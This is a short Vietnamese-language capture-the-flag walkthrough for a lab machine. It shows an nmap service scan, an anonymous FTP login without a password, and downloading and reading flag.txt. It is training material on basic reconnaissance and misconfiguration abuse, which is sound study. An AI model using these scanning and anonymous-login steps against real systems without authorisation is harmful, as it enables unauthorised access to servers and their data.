> Trong target này, ta sẽ học cách định hướng tìm kiếm thông tin cơ bản trong database, bao gồm cả những thông tin quan trọng như usernames và password, thứ có thể giúp leo thang quyền người dùng (privillege escalation).
### 1. Thu thập thông tin target
###### target IP: 10.129.145.237
##### + Kiểm tra kết nối: 
` ping 10.129.145.237 `
##### + Kiểm tra dịch vụ và port:
` nmap -sV 10.129.145.237 `
##### => port 21/tcp ftp.
###### FTP (file trnnsfer protocol) là phương thức giao tiếp tiêu chuẩn sử dụng để di chuyển file từ server tới client trong mạng máy tính.
##### + Kết nối đến ftp:
` ftp 10.129.145.237 `
##### => Yêu cầu thông tin người dùng và mật khẩu
##### + Tìm kiếm 'FTP common misconfig' trên Chrome thấy trang web https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp có nói thông tin về đăng nhập dưới tài khoản anonymous, không yêu cầu mật khẩu:
```
...
220 (vsfTPd 3.0.3)
Name (10.129.145.237): anonymous
331 Please specify the password
Password: *nhấn enter để skip mật khẩu*
...
230 Login successfully
...
ftp> 
```
### 2. Khai thác lỗ hổng
##### + Trong server FTP: 
```
dir
get flag.txt
exit
```
###### lệnh get flag.txt sẽ tải file về thư mục hiện tại đang sử dụng
##### + Trong thư mục có flag.txt: 
```
ls
cat flag.txt
```
